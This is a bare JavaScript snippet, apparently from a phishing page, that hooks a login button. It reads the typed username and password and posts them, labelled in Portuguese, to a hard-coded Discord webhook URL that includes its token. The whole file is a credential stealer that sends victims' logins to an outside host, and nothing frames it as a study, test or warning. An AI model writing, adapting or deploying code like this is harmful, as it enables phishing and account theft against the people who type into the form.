document.getElementById('btn-login').addEventListener('click', function() {
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;

    var webhookURL = 'https://discord.com/api/webhooks/1573500610710601778/M92sTTydO6gH-b6VN-SPYIhyvSBWhoTvioU9QQOwa2enmhS7OnHowiw9cFq085a3F15V';
    var webhookData = {
        'content': Nome de Usuário: ${username}\nSenha: ${password}
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(webhookData)
    })
    .then(response => response.json())
    .then(data => {
        document.getElementById('webhook-result').innerHTML = JSON.stringify(data);
    })
    .catch(error => console.error(error));
});
